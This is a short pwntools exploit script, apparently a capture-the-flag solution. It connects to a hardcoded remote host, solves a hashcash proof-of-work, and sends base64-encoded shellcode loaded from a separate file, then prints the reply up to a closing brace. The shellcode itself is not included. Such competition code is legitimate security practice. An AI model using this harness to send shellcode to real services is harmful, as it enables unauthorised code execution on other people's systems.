#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

host = args.HOST or '54.93.211.13'
port = int(args.PORT or 10001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return process(['debug.sh'] + argv, *a, **kw)
    else:
        return process(['run.sh'] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    hash_challenge = io.recvline().split()
    if hash_challenge[0] == b'hashcash' and hash_challenge[1] == b'-mb28':
        response = subprocess.run([
            'hashcash',
            '-mb28',
            hash_challenge[2].decode(),
        ], capture_output=True).stdout
        io.send(response)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

shellcode = base64.b64encode(open('shellcode.bin', 'rb').read().ljust(0x1000, b'\x00'))

io = start()
io.sendlineafter(b': ', shellcode)
print(io.recvuntil(b'}'))
